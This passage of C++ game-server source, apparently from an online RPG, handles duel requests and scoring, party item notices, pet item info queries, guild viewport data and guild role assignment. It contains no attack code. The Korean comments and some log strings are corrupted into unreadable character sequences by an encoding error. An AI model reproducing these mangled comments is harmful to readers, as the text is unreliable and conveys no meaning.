	// ���濡�� ���� ��û�� ������.
	PMSG_REQ_DUEL_OK pMsg;
	pMsg.h.c = PMHC_BYTE;
	pMsg.h.headcode = 0xAC;
	pMsg.h.size = sizeof( pMsg );

	pMsg.NumberH = HIBYTE(aIndex);
	pMsg.NumberL = LOBYTE(aIndex);
	memcpy(pMsg.szName, gObj[aIndex].Name, MAX_IDSTRING);
	DataSend(iDuelIndex, (LPBYTE)&pMsg, pMsg.h.size);
	

	// ������ ������ ��û�ϴ� ���̶�� �޽����� ������.
	wsprintf(szTempText, lMsg.Get(1196), gObj[iDuelIndex].Name);			// "%s�Կ��� ������ ��û�߽��ϴ�."
	GCServerMsgStringSend(szTempText, aIndex, 1);

	LogAddTD("[Duel] [%s][%s] Requested to Start Duel to [%s][%s]",
		lpObj->AccountID,
		lpObj->Name,
		gObj[iDuelIndex].AccountID,
		gObj[iDuelIndex].Name
		);
}


//----------------------------------------------------------------------------
// [0xAB] ���� ���Ḧ ��û�Ѵ�.
void CGDuelEndRequestRecv(LPPMSG_REQ_END_DUEL lpMsg, int aIndex)
{

#ifdef GAMESERVER_TO_CASTLESIEGESERVER // ������ �߿� ����, ���� ���� ���´�.
	return;
#endif

	int iDuelIndex = -1;		// ���� �����ϰ� �ִ� ������ �ε���

	// �������̸�..
	if( gObj[aIndex].CloseType != -1 )
	{
		return;
	}
	
	// ������ �̹� ������ ��û�ߴٸ�
	if (CHECK_LIMIT(gObj[aIndex].m_iDuelUserReserved, MAX_OBJECT)) {
		gObj[aIndex].m_iDuelUserReserved = -1;
	}

	// ������ �ϰ� �־��ٸ�
	if (CHECK_LIMIT(gObj[aIndex].m_iDuelUser, MAX_OBJECT)) {
		iDuelIndex = gObj[aIndex].m_iDuelUser;
		gObj[aIndex].m_iDuelUser = -1;
//		GCServerMsgStringSend("������ ����Ǿ����ϴ�.", aIndex, 1);

		PMSG_ANS_END_DUEL pMsg;
		pMsg.h.c = PMHC_BYTE;
		pMsg.h.headcode = 0xAB;
		pMsg.h.size = sizeof( pMsg );

		pMsg.NumberH = HIBYTE(iDuelIndex);
		pMsg.NumberL = LOBYTE(iDuelIndex);
		memcpy(pMsg.szName, gObj[iDuelIndex].Name, MAX_IDSTRING);
		DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);

		if( iDuelIndex == aIndex ) {
			// ���� ���� �ڽſ��� ������ ��û�ߴ� ���̶�� ���� -> ������.
			return;
		}
	}
	else {
		// ������ �ϰ� ���� �ʾҴٸ� -> �׳� ������.
		LogAdd("error : %s %d (%d)",__FILE__, __LINE__, iDuelIndex);
		return;
	}

	// ������ �ߴ� ���浵 ���Ḧ ���־�� �Ѵ�.
	if (CHECK_LIMIT(gObj[iDuelIndex].m_iDuelUser, MAX_OBJECT)) {
		if (gObj[iDuelIndex].m_iDuelUser == aIndex) {
			// ���浵 ���� �ο�� �־��� ���� �����ؾ� �Ѵ�.
//			GCServerMsgStringSend("������ ��û���� ������ ����Ǿ����ϴ�.", iDuelIndex, 1);
			gObj[iDuelIndex].m_iDuelUser = -1;


			PMSG_ANS_END_DUEL pMsg;
			pMsg.h.c = PMHC_BYTE;
			pMsg.h.headcode = 0xAB;
			pMsg.h.size = sizeof( pMsg );

			pMsg.NumberH = HIBYTE(aIndex);
			pMsg.NumberL = LOBYTE(aIndex);

			memcpy(pMsg.szName, gObj[aIndex].Name, MAX_IDSTRING);
			DataSend(iDuelIndex, (LPBYTE)&pMsg, pMsg.h.size);

			LogAddTD("[Duel] [%s][%s] Duel Ended [%s][%s]",
				gObj[aIndex].AccountID,
				gObj[aIndex].Name,
				gObj[iDuelIndex].AccountID,
				gObj[iDuelIndex].Name
				);
		}
		else {
			// �ο�� ��밡 ���� �޶��� ����!!
			return;
		}
	}
	else {
		// ������ ������ �ϰ� ���� �ʾҴٸ� ���� !! -> �׳� ������.
		return;
	}
}


//----------------------------------------------------------------------------
// [0xAC] ������û�� ���� ������ ����
void CGDuelOkRequestRecv(LPPMSG_ANS_DUEL_OK lpMsg, int aIndex)
{

#ifdef GAMESERVER_TO_CASTLESIEGESERVER // ������ �߿� ����, ���� ���� ���´�.
	return;
#endif
	
	int iDuelIndex = -1;		// ���� ������ ������ �ε���

	// Ŭ���̾�Ʈ���� ����� �˷��� ��Ŷ
	PMSG_ANS_START_DUEL pMsgSend;
	pMsgSend.h.c = PMHC_BYTE;
	pMsgSend.h.headcode = 0xAA;
	pMsgSend.h.size = sizeof( pMsgSend );


	// �������̸�..
	if( gObj[aIndex].CloseType != -1 )
	{
		return;
	}

	// ������ ��û�� ������ Ȯ���Ѵ�.
	iDuelIndex = MAKEWORD(lpMsg->NumberL, lpMsg->NumberH);
	if (CHECK_LIMIT(iDuelIndex, MAX_OBJECT)) {

		// ���� ��û�ߴ� ����ڰ� �ִ��� �˻�.
		if( gObjIsConnected(iDuelIndex) == FALSE ) return;
		if( gObj[iDuelIndex].Type == OBJTYPE_MONSTER ) return;
		if( gObj[iDuelIndex].CloseCount >= 0 ) return;

#ifdef CHAOSCASTLE_DUAL_GUILDWAR_CHANGE_20040614		
	#ifndef WORLD_TOURNAMENT_EVENT_SETTING	
		if( lpMsg->bDuelOK != 0 )
		{
			if (CHECK_BLOODCASTLE(gObj[iDuelIndex].MapNumber) ||		// ����ĳ��
				CHECK_CHAOSCASTLE(gObj[iDuelIndex].MapNumber) ||		// ī����ĳ��
#ifdef DEVILSQUARE_EXTEND_20050221		// ���������� �ʹ�ȣ üũ ����
				CHECK_DEVILSQUARE(gObj[iDuelIndex].MapNumber)			// ����������
#else
				gObj[iDuelIndex].MapNumber == 9							// ����������
#endif
				)
			{
				GCServerMsgStringSend(lMsg.Get(1231), aIndex, 1);		// "ī���� ĳ�� �ȿ����� ���� ��û�� �� �� �����ϴ�."			

				gObj[aIndex].m_iDuelUserRequested = -1;
				gObj[iDuelIndex].m_iDuelUserReserved = -1;

				memcpy(pMsgSend.szName, gObj[aIndex].Name, MAX_IDSTRING);

				pMsgSend.bDuelStart = FALSE;
				DataSend(iDuelIndex, (LPBYTE)&pMsgSend, pMsgSend.h.size);
				return;
			}	
		}
	#endif		// #ifndef WORLD_TOURNAMENT_EVENT_SETTING	
#endif


		// ���� ������ �̹� ������ �ϰ� �ִٸ�
		if (CHECK_LIMIT(gObj[aIndex].m_iDuelUser, MAX_OBJECT)) {
			GCServerMsgStringSend(lMsg.Get(1184), aIndex, 1);		// "����� �̹� ���� �� �Դϴ�."
			GCServerMsgStringSend(lMsg.Get(1185), aIndex, 1);		// "������� �ϱ����ؼ� ���� ������ ������ּ���."

			gObj[aIndex].m_iDuelUserRequested = -1;
			gObj[iDuelIndex].m_iDuelUserReserved = -1;
			memcpy(pMsgSend.szName, gObj[aIndex].Name, MAX_IDSTRING);

			pMsgSend.bDuelStart = FALSE;
			DataSend(iDuelIndex, (LPBYTE)&pMsgSend, pMsgSend.h.size);
			return;
		}

		// ������ �̹� ������ ��û�߾��ٸ�
		if (CHECK_LIMIT(gObj[aIndex].m_iDuelUserReserved, MAX_OBJECT)) {
			GCServerMsgStringSend(lMsg.Get(1197), aIndex, 1);		// "����� �̹� ������û �� �Դϴ�."

			gObj[aIndex].m_iDuelUserRequested = -1;
			gObj[iDuelIndex].m_iDuelUserReserved = -1;

			memcpy(pMsgSend.szName, gObj[aIndex].Name, MAX_IDSTRING);

			pMsgSend.bDuelStart = FALSE;
			DataSend(iDuelIndex, (LPBYTE)&pMsgSend, pMsgSend.h.size);
			return;
		}

		if (gObj[iDuelIndex].m_iDuelUserReserved == aIndex) {
			// ���� ������ ��û�� ��밡 ���ϴ� ���� �ٸ���.
			CHAR szDuelName[11] = {0,}, szDuelName2[11] = {0,};
			memcpy (szDuelName, gObj[iDuelIndex].Name, MAX_IDSTRING);	szDuelName[10] = 0;
			memcpy (szDuelName2, lpMsg->szName, MAX_IDSTRING);			szDuelName2[10] = 0;
			
			if (!strcmp(szDuelName, szDuelName2)) {
				// ������ ������ ������ ��û�ߴ� ����� ���� �´ٸ� -> �������� ����

				if (lpMsg->bDuelOK == 0) {
					// ������ �����ʴ´ٰ� �˸�
					gObj[aIndex].m_iDuelUserRequested = -1;
					gObj[iDuelIndex].m_iDuelUserReserved = -1;

					memcpy(pMsgSend.szName, gObj[aIndex].Name, MAX_IDSTRING);

					pMsgSend.bDuelStart = FALSE;
					DataSend(iDuelIndex, (LPBYTE)&pMsgSend, pMsgSend.h.size);
				}
				else if (lpMsg->bDuelOK == 1) {
					// ������ �Ѵٰ� �˸�
					
					gObj[iDuelIndex].m_iDuelUserReserved = -1;
					gObj[iDuelIndex].m_btDuelScore = 0;
					gObj[iDuelIndex].m_iDuelUser = aIndex;
#ifdef DUEL_SYSTEM_FIX_20031224
					gObj[iDuelIndex].m_iDuelTickCount = GetTickCount();
#endif
#ifdef WORLD_TOURNAMENT_EVENT_SETTING
					gObj[iDuelIndex].m_iDuelTimer = GetTickCount();
#endif


					gObj[aIndex].m_iDuelUserRequested = -1;
					gObj[aIndex].m_iDuelUserReserved = -1;
					gObj[aIndex].m_btDuelScore = 0;
					gObj[aIndex].m_iDuelUser = iDuelIndex;
#ifdef DUEL_SYSTEM_FIX_20031224
					gObj[aIndex].m_iDuelTickCount = GetTickCount();
#endif

#ifdef WORLD_TOURNAMENT_EVENT_SETTING
					gObj[aIndex].m_iDuelTimer = GetTickCount();
#endif
					
					pMsgSend.bDuelStart = TRUE;
					
					// ������ �㰡�� ���
					pMsgSend.NumberH = HIBYTE(iDuelIndex);
					pMsgSend.NumberL = LOBYTE(iDuelIndex);
					memcpy(pMsgSend.szName, szDuelName, MAX_IDSTRING);
					DataSend(aIndex, (LPBYTE)&pMsgSend, pMsgSend.h.size);
					
					// ������ ��û�� ���
					pMsgSend.NumberH = HIBYTE(aIndex);
					pMsgSend.NumberL = LOBYTE(aIndex);
					memcpy(pMsgSend.szName, gObj[aIndex].Name, MAX_IDSTRING);
					DataSend(iDuelIndex, (LPBYTE)&pMsgSend, pMsgSend.h.size);
					
					// Ŭ���̾�Ʈ ������ �ʱ�ȭ ���ش�.
					GCSendDuelScore(gObj[aIndex].m_Index, gObj[iDuelIndex].m_Index);
					
					LogAddTD("[Duel] [%s][%s] Duel Started [%s][%s]",
						gObj[aIndex].AccountID,
						gObj[aIndex].Name,
						gObj[iDuelIndex].AccountID,
						gObj[iDuelIndex].Name
						);
				}
			}
			else {
				// ���� ������ �Ϸ��� �ߴ� ������ �ƴϴ�. (�� ����)
				gObj[aIndex].m_iDuelUserRequested = -1;
				gObj[iDuelIndex].m_iDuelUserReserved = -1;
				
				pMsgSend.bDuelStart = FALSE;
				DataSend(iDuelIndex, (LPBYTE)&pMsgSend, pMsgSend.h.size);
				return;
			}
		}
		else {
			// ������ ������ ��û�ߴ� ����� ���� �ƴϴ�. (���� ����) -> ��·�ų� �װ� ��ٸ��� ���� �����Ƿ� ���ٰ� �����ش�.
			gObj[aIndex].m_iDuelUserRequested = -1;
			gObj[iDuelIndex].m_iDuelUserReserved = -1;

			pMsgSend.bDuelStart = FALSE;
			DataSend(iDuelIndex, (LPBYTE)&pMsgSend, pMsgSend.h.size);
		}
	}
	else {
		// Ŭ���̾�Ʈ���� ���� �ε������� �̻��ϴ�.
		return;
	}
}


//----------------------------------------------------------------------------
// [0xAD] ���� ������ �������� ������
void GCSendDuelScore (int aIndex1, int aIndex2)
{

#ifdef GAMESERVER_TO_CASTLESIEGESERVER // ������ �߿� ����, ���� ���� ���´�.
	return;
#endif
	
	if (!CHECK_LIMIT(aIndex1, MAX_OBJECT) || !CHECK_LIMIT(aIndex2, MAX_OBJECT)) {
		return;
	}

	// ������ ���� ����ڰ� �ִ��� �˻�.
	if( gObjIsConnected(aIndex1) == FALSE ||
		gObjIsConnected(aIndex2) == FALSE
		) return;
	if( gObj[aIndex1].Type == OBJTYPE_MONSTER ||
		gObj[aIndex2].Type == OBJTYPE_MONSTER
		) return;
	if( gObj[aIndex1].CloseCount >= 0 ||
		gObj[aIndex2].CloseCount >= 0
		) return;

	PMSG_ANS_DUEL_SCORE pMsg;
	pMsg.h.c = PMHC_BYTE;
	pMsg.h.headcode = 0xAD;
	pMsg.h.size = sizeof( pMsg );

	pMsg.NumberH1 = HIBYTE(aIndex1);
	pMsg.NumberL1 = LOBYTE(aIndex1);
	pMsg.NumberH2 = HIBYTE(aIndex2);
	pMsg.NumberL2 = LOBYTE(aIndex2);

	pMsg.btDuelScore1 = gObj[aIndex1].m_btDuelScore;
	pMsg.btDuelScore2 = gObj[aIndex2].m_btDuelScore;

	DataSend(aIndex1, (LPBYTE)&pMsg, pMsg.h.size);
	DataSend(aIndex2, (LPBYTE)&pMsg, pMsg.h.size);
}
#endif // ADD_NEWPVP_PKFIELD
#endif

#ifdef SEND_GETITEMINFO_FOR_MYPARTY
void GCSendGetItemInfoForParty(int aIndex, CMapItem* lpItem)
{
	LPOBJECTSTRUCT lpObj = &gObj[aIndex];

	if( lpObj->PartyNumber >= 0 )
	{
		PMSG_GETITEMINFO_FOR_PARTY	pMsg;
		pMsg.h.c = PMHC_BYTE;
		pMsg.h.headcode = 0x47;
		pMsg.h.size = sizeof(pMsg);

		pMsg.NumberH	= HIBYTE(aIndex);
		pMsg.NumberL	= LOBYTE(aIndex);		

		pMsg.ItemInfo = lpItem->m_Type&PARTY_ITEMINFO_ITEMTYPE;

		if( lpItem->m_Option1 )	// ��ų
			pMsg.ItemInfo |= PARTY_ITEMINFO_SKILL;

		if( lpItem->m_Option2 )	// ���
			pMsg.ItemInfo |= PARTY_ITEMINFO_LUCK;

		if( lpItem->m_Option3 )	// �ɼ�
			pMsg.ItemInfo |= PARTY_ITEMINFO_OP;

		if( lpItem->m_NewOption )	// ������Ʈ
			pMsg.ItemInfo |= PARTY_ITEMINFO_EX;

		if( lpItem->m_SetOption )	// ��Ʈ������
			pMsg.ItemInfo |= PARTY_ITEMINFO_SET;

#ifdef ADD_380ITEM_NEWOPTION_20060711
		if ( g_kItemSystemFor380.Is380OptionItem( lpItem ) == TRUE )
		{
			pMsg.ItemInfo |= PARTY_ITEMINFO_380OPTION;		// 380 �߰� �ɼ�
		}
#endif // ADD_380ITEM_NEWOPTION_20060711

#ifdef SEND_GETITEMINFO_FOR_MYPARTY_ADD_LEVEL	
		pMsg.Level = lpItem->m_Level;
#endif
		int partycount = gParty.GetPartyCount(lpObj->PartyNumber);
		if( partycount >= 0 )
		{
			for( int n=0; n<MAX_PARTYUSER; n++)
			{
				int number = gParty.m_PartyS[lpObj->PartyNumber].Number[n];
				if( number >= 0 )
				{
					DataSend(number, (LPBYTE)&pMsg, pMsg.h.size);
				}
			}
		}
	}
}
#endif

#ifdef ADD_EFFECT_LEVELUP_20040401
void GCSendEffectInfo(int aIndex, BYTE btType)
{
	if(!CHECK_LIMIT(aIndex, MAX_OBJECT)) 
		return;

	LPOBJECTSTRUCT lpObj = &gObj[aIndex];

	PMSG_EFFECTINFO	pMsg;
	pMsg.h.c		= PMHC_BYTE;
	pMsg.h.headcode	= 0x48;
	pMsg.h.size		= sizeof(PMSG_EFFECTINFO);
	pMsg.NumberH	= HIBYTE(aIndex);
	pMsg.NumberL	= LOBYTE(aIndex);		

	pMsg.btType		= btType;

#ifdef ADD_SHIELD_POINT_01_20060403
	if ( btType == EFFECT_SHIELDBROKE )
	{
		// ���� �ı� ����Ʈ�� �ڽſ��Ե� ������.
		DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
	}
#endif // ADD_SHIELD_POINT_01_20060403

	MsgSendV2(lpObj, (LPBYTE)&pMsg, pMsg.h.size);
}


#endif	// #ifdef ADD_EFFECT_LEVELUP_20040401

#ifdef DARKLORD_WORK
// 0xA7 �� ������ Ŀ�ǵ� ���� ��û
void CGRequestPetItemCommand(LPPMSG_REQUEST_PET_ITEM_COMMAND lpMsg, int aIndex)
{
	if( gObjIsConnectedGP(aIndex) == FALSE ) 
	{
		LogAddTD("error-L2 : Index %s %d", __FILE__, __LINE__);
		return;
	}

	if(!CHECK_LIMIT(aIndex, MAX_OBJECT)) 
		return;

	LPOBJECTSTRUCT lpObj = &gObj[aIndex];

	if( lpMsg->PetType != 0 )
		return;	// ��ũ���Ǹ��� �ƴ�

	int iTargetIndex = MAKEWORD(lpMsg->NumberL, lpMsg->NumberH);
	gDarkSpirit[aIndex].ChangeCommand(lpMsg->Command,iTargetIndex);

}

void CGRequestPetItemInfo(LPPMSG_REQUEST_PET_ITEMINFO lpMsg, int aIndex)
{
	if( gObjIsConnectedGP(aIndex) == FALSE ) 
	{
		LogAddTD("error-L2 : Index %s %d", __FILE__, __LINE__);
		return;
	}

	if(!CHECK_LIMIT(aIndex, MAX_OBJECT)) 
		return;

	LPOBJECTSTRUCT lpObj = &gObj[aIndex];

	if( lpMsg->PetType != 0 && lpMsg->PetType != 1 )
		return;	// ��ũ���Ǹ��� �ƴ�

	PMSG_SEND_PET_ITEMINFO pMsg;
	pMsg.h.set((LPBYTE)&pMsg, 0xA9, sizeof(pMsg));

	pMsg.PetType = lpMsg->PetType;
	pMsg.InvenType = lpMsg->InvenType;
	pMsg.nPos = lpMsg->nPos;

	if( lpMsg->InvenType == 0 )
	{	// �κ�
		
#ifdef PERSONAL_SHOP_20040113		
		if(!CHECK_LIMIT(lpMsg->nPos, MAX_INVENTORY_EXTEND)) 
#else
		if(!CHECK_LIMIT(lpMsg->nPos, MAX_INVENTORY)) 
#endif
		{
			LogAddTD("[PetItem] [%s][%s] RequestPetItem Invalid Iventory nPos %d", 
					 lpObj->AccountID, lpObj->Name, lpMsg->nPos);
			return;
		}

		if( lpObj->pInventory[lpMsg->nPos].IsItem() )
		{
			pMsg.Exp = lpObj->pInventory[lpMsg->nPos].m_PetItem_Exp;
			pMsg.Level = lpObj->pInventory[lpMsg->nPos].m_PetItem_Level;
			
#ifdef MODIFY_DARKLORD_SEND_INFO_PROTOCOL_EXTEND_20080626
			pMsg.Life = (BYTE)(lpObj->pInventory[lpMsg->nPos].m_Durability);
#endif // MODIFY_DARKLORD_SEND_INFO_PROTOCOL_EXTEND_20080626

			DataSend(aIndex, (LPBYTE)&pMsg, sizeof(pMsg));
		}
	}
	else if( lpMsg->InvenType == 1 )
	{	// â��
		if( lpObj->LoadWareHouseInfo )
		{
			if(!CHECK_LIMIT(lpMsg->nPos, MAX_WAREHOUSEITEMS)) 
			{
				LogAddTD("[PetItem] [%s][%s] RequestPetItem Invalid WareHouse nPos %d", 
						 lpObj->AccountID, lpObj->Name, lpMsg->nPos);
				return;
			}

			if( lpObj->pWarehouse[lpMsg->nPos].IsItem() )
			{
				pMsg.Exp = lpObj->pWarehouse[lpMsg->nPos].m_PetItem_Exp;
				pMsg.Level = lpObj->pWarehouse[lpMsg->nPos].m_PetItem_Level;

#ifdef MODIFY_DARKLORD_SEND_INFO_PROTOCOL_EXTEND_20080626
				pMsg.Life = (BYTE)(lpObj->pWarehouse[lpMsg->nPos].m_Durability);
#endif // MODIFY_DARKLORD_SEND_INFO_PROTOCOL_EXTEND_20080626

				DataSend(aIndex, (LPBYTE)&pMsg, sizeof(pMsg));
			}
		}
	}
	else if( lpMsg->InvenType == 2 )
	{	// �ŷ�â
		if( lpObj->m_IfState.use < 1 || lpObj->m_IfState.type != I_TRADE ) 
		{
			return;
		}
		if(!CHECK_LIMIT(lpMsg->nPos, MAX_TRADEITEM)) 
		{
			LogAddTD("[PetItem] [%s][%s] RequestPetItem Invalid Trade nPos %d", 
					 lpObj->AccountID, lpObj->Name, lpMsg->nPos);
			return;
		}

		if( lpObj->Trade[lpMsg->nPos].IsItem() )
		{
			pMsg.Exp = lpObj->Trade[lpMsg->nPos].m_PetItem_Exp;
			pMsg.Level = lpObj->Trade[lpMsg->nPos].m_PetItem_Level;

#ifdef MODIFY_DARKLORD_SEND_INFO_PROTOCOL_EXTEND_20080626
			pMsg.Life = (BYTE)(lpObj->Trade[lpMsg->nPos].m_Durability);
#endif // MODIFY_DARKLORD_SEND_INFO_PROTOCOL_EXTEND_20080626

			DataSend(aIndex, (LPBYTE)&pMsg, sizeof(pMsg));
		}
	}
	else if( lpMsg->InvenType == 3 )
	{	// ����ŷ�â
		if( lpObj->m_IfState.use < 1 || lpObj->m_IfState.type != I_TRADE ) 
		{
			return;
		}

		int iTargetIndex = gObj[aIndex].TargetNumber;
		if( iTargetIndex < 0 )
		{
			return;
		}

		if(!CHECK_LIMIT(iTargetIndex, MAX_OBJECT)) 
		{
			return;
		}

		if( gObj[iTargetIndex].m_IfState.use < 1 || gObj[iTargetIndex].m_IfState.type != I_TRADE ) 
		{
			return;
		}

		if(!CHECK_LIMIT(lpMsg->nPos, MAX_TRADEITEM)) 
		{
			LogAddTD("[PetItem] [%s][%s] RequestPetItem Invalid TargetTrade nPos %d", 
					 lpObj->AccountID, lpObj->Name, lpMsg->nPos);
			return;
		}

		if( gObj[iTargetIndex].Trade[lpMsg->nPos].IsItem() )
		{
			pMsg.Exp = gObj[iTargetIndex].Trade[lpMsg->nPos].m_PetItem_Exp;
			pMsg.Level = gObj[iTargetIndex].Trade[lpMsg->nPos].m_PetItem_Level;

#ifdef MODIFY_DARKLORD_SEND_INFO_PROTOCOL_EXTEND_20080626
			pMsg.Life = (BYTE)(gObj[iTargetIndex].Trade[lpMsg->nPos].m_Durability);
#endif // MODIFY_DARKLORD_SEND_INFO_PROTOCOL_EXTEND_20080626

			DataSend(aIndex, (LPBYTE)&pMsg, sizeof(pMsg));
		}
	}
	else if( lpMsg->InvenType == 4 )
	{	// ī���� ����
		if(!CHECK_LIMIT(lpMsg->nPos, MAX_CHAOSBOXSIZE)) 
		{
			LogAddTD("[PetItem] [%s][%s] RequestPetItem Invalid Chaos nPos %d", 
					 lpObj->AccountID, lpObj->Name, lpMsg->nPos);
			return;
		}

		if( lpObj->pChaosBox[lpMsg->nPos].IsItem() )
		{
			pMsg.Exp = lpObj->pChaosBox[lpMsg->nPos].m_PetItem_Exp;
			pMsg.Level = lpObj->pChaosBox[lpMsg->nPos].m_PetItem_Level;

#ifdef MODIFY_DARKLORD_SEND_INFO_PROTOCOL_EXTEND_20080626
			pMsg.Life = (BYTE)(lpObj->pChaosBox[lpMsg->nPos].m_Durability);
#endif // MODIFY_DARKLORD_SEND_INFO_PROTOCOL_EXTEND_20080626

			DataSend(aIndex, (LPBYTE)&pMsg, sizeof(pMsg));
		}
	}
	else if( lpMsg->InvenType == 5 )
	{	// ���λ��� ����
#ifdef PERSONAL_SHOP_20040113		
		if(!CHECK_LIMIT(lpMsg->nPos, MAX_INVENTORY_EXTEND)) 
#else
		if(!CHECK_LIMIT(lpMsg->nPos, MAX_INVENTORY)) 
#endif
		{
			LogAddTD("[PetItem] [%s][%s] RequestPetItem Invalid Iventory nPos %d", 
					 lpObj->AccountID, lpObj->Name, lpMsg->nPos);
			return;
		}

		if( lpObj->m_iPShopDealerIndex != -1 )
		{
			if(CHECK_LIMIT(lpObj->m_iPShopDealerIndex, MAX_OBJECT)) 
			{	
				if( gObj[lpObj->m_iPShopDealerIndex].pInventory[lpMsg->nPos].IsItem() )				
				{
					pMsg.Exp = gObj[lpObj->m_iPShopDealerIndex].pInventory[lpMsg->nPos].m_PetItem_Exp;
					pMsg.Level = gObj[lpObj->m_iPShopDealerIndex].pInventory[lpMsg->nPos].m_PetItem_Level;

#ifdef MODIFY_DARKLORD_SEND_INFO_PROTOCOL_EXTEND_20080626
					pMsg.Life = (BYTE)(gObj[lpObj->m_iPShopDealerIndex].pInventory[lpMsg->nPos].m_Durability);
#endif // MODIFY_DARKLORD_SEND_INFO_PROTOCOL_EXTEND_20080626

					DataSend(aIndex, (LPBYTE)&pMsg, sizeof(pMsg));
				}
			}
		}
	}
}
#endif	// #ifdef DARKLORD_WORK


#ifdef MODIFY_GUILD_VIEWPORT_01_20040701
void GCGuildViewportInfo( LPPMSG_REQ_GUILDVIEWPORT aRecv, int aIndex )
{
	if( gObjIsConnectedGP(aIndex) == FALSE ) 
	{
		LogAddTD("error-L2 : Index %s %d", __FILE__, __LINE__);
		return;
	}

	if(!CHECK_LIMIT(aIndex, MAX_OBJECT)) 
		return;

	LPOBJECTSTRUCT lpObj = &gObj[aIndex];

#ifdef MODIFY_GUILD_VIEWPORT_02_20040830
	DWORD	dwGuildNumber = aRecv->GuildNumber;
	LPGUILD_INFO lpGuildInfo = Guild.SearchGuild_Number( dwGuildNumber);
#else
	WORD wGuildNumber = MAKEWORD( aRecv->NumberL, aRecv->NumberH );
	LPGUILD_INFO lpGuildInfo = Guild.SearchGuild_Number( wGuildNumber);
#endif
		
	if( lpGuildInfo != NULL )
	{
		PMSG_ANS_GUILDVIEWPORT	pMsg;
		pMsg.h.c		= PMHC_BYTE;
		pMsg.h.headcode	= 0x66;
		pMsg.h.size		= sizeof(PMSG_ANS_GUILDVIEWPORT);
		
#ifdef MODIFY_GUILD_VIEWPORT_02_20040830
		pMsg.GuildNumber = lpGuildInfo->Number;
#else
		pMsg.NumberH = HIBYTE(lpGuildInfo->Number);
		pMsg.NumberL = LOBYTE(lpGuildInfo->Number);		
#endif
		
#ifdef ADD_NEW_GUILD_02_20040922
		pMsg.btGuildType = lpGuildInfo->btGuildType;
#endif

#ifdef ADD_NEW_UNION_01_20041006
		TUnionInfo* pUnionInfo = UnionManager.SearchUnion(lpGuildInfo->iGuildUnion);
		if( pUnionInfo != NULL)
			memcpy(pMsg.UnionName, pUnionInfo->m_szMasterGuild, MAX_GUILDNAMESTRING );
		else
			pMsg.UnionName[0] = '\0';
#endif

		strcpy(pMsg.GuildName, lpGuildInfo->Name);
		memcpy(pMsg.Mark, lpGuildInfo->Mark, 32);
		
		DataSend( aIndex, (LPBYTE)&pMsg, sizeof(PMSG_ANS_GUILDVIEWPORT) );
	}
	else
	{
#ifdef MODIFY_GUILD_VIEWPORT_02_20040830
		LogAddTD("�ڡڡ� ��� ���� ã���� ����. �̸� : [%s] ��ȣ : %d", lpObj->Name, dwGuildNumber);		
#else
		LogAddTD("�ڡڡ� ��� ���� ã���� ����. �̸� : [%s] ��ȣ : %d", lpObj->Name, wGuildNumber);		
#endif
	}
	
}
#endif

#ifdef ADD_NEW_GUILD_01_20040913
// [0xE1] �Ӹ� & ���� & ����
void CGGuildAssignStatus( LPPMSG_GUILD_ASSIGN_STATUS_REQ aRecv, int aIndex )
{
	if( gObjIsConnectedGP(aIndex) == FALSE ) 
	{
		LogAddTD("error-L2 : Index %s %d", __FILE__, __LINE__);
		return;
	}

	if(!CHECK_LIMIT(aIndex, MAX_OBJECT)) 
		return;

	LPOBJECTSTRUCT lpObj = &gObj[aIndex];
	
	PMSG_GUILD_ASSIGN_STATUS_RESULT pMsg = {0,};
	pMsg.h.set((LPBYTE)&pMsg, 0xE1, sizeof(pMsg));
	pMsg.btType = aRecv->btType;
	memcpy( pMsg.szTagetName, aRecv->szTagetName, MAX_IDSTRING );

	// 0 . > ��带 ������ �ִ��� �˻�
	if( lpObj->GuildNumber <= 0 || lpObj->lpGuild == NULL )
	{
		pMsg.btResult = GUILD_ANS_NOTEXIST_GUILD;
		DataSend( aIndex, (LPBYTE)&pMsg, sizeof(pMsg) );

		return;
	}

	// 1 . > �Ӹ��� �� �ִ� '����'�� ������ �ִ°�?
	if( gObj[aIndex].GuildStatus != G_MASTER )
	{
		pMsg.btResult = GUILD_ANS_NOTEXIST_PERMISSION;
		DataSend( aIndex, (LPBYTE)&pMsg, sizeof(pMsg) );
		
		return;
	}
	
	// 3. �渶 �ڽ��� �Ӹ��� �� ����.
	char szTargetName[MAX_IDSTRING+1] = {0,};
	CopyMemory( szTargetName, aRecv->szTagetName, MAX_IDSTRING );

	if( strcmp(gObj[aIndex].Name, szTargetName) == 0 )
	{
		pMsg.btResult = GUILD_ANS_NOTEXIST_PERMISSION;
		DataSend( aIndex, (LPBYTE)&pMsg, sizeof(pMsg) );
		
		return;
	}
	
#ifdef MODIFY_ASSIGN_GUILD_STATUS_20041123
	if( lpObj->lpGuild == NULL )
		return;

	// 2 . > �Ӹ�&���� �� �� �ִ� '��å'�� �ִ°�?
	if( aRecv->btType == 0x01 ||  aRecv->btType == 0x02 )
	{
		// 4. ��å ���� ��´�.
		INT iSubMasterCount = 0;
		INT iBattleMasterCount = 0;

		for( int n=0; n<MAX_GUILD; n++)
		{
			if( (lpObj->lpGuild->Use[n] > 0) )
			{
				if( lpObj->lpGuild->GuildStatus[n] == G_SUB_MASTER )
				{
					iSubMasterCount++;
				}
				else if( lpObj->lpGuild->GuildStatus[n] == G_BATTLE_MASTER )
				{
					iBattleMasterCount++;
				}
			}
		}

		if( aRecv->btGuildStatus==G_SUB_MASTER )
		{
			// �α渶�� �Ѹ�.
			if( iSubMasterCount == 0 )
			{
				GDGuildReqAssignStatus( aIndex, aRecv->btType, aRecv->szTagetName, aRecv->btGuildStatus );

				return;
			}
			else
			{
				pMsg.btResult = GUILD_ANS_NOTEXIST_EXTRA_STATUS;
				DataSend( aIndex, (LPBYTE)&pMsg, sizeof(pMsg) );
				
				return;
			}

		}
		else if( aRecv->btGuildStatus==G_BATTLE_MASTER )
		{
			// ��Ʋ�����ʹ� Level / 200 + 1 ��ŭ��.
#ifdef MASTER_LEVEL_UP_SYSTEM_20070912	// ���շ��� ���� - ���: ��Ʋ������ �ο� ����
			if( iBattleMasterCount < ( ( lpObj->Level + lpObj->m_nMasterLevel ) / 200 + 1) )
#else
			if( iBattleMasterCount < (lpObj->Level / 200+1) )
#endif
			{
				GDGuildReqAssignStatus( aIndex, aRecv->btType, aRecv->szTagetName, aRecv->btGuildStatus );
				
				return;
			}
			else
			{
				pMsg.btResult = GUILD_ANS_NOTEXIST_EXTRA_STATUS;
				DataSend( aIndex, (LPBYTE)&pMsg, sizeof(pMsg) );
				
				return;
			}
		}
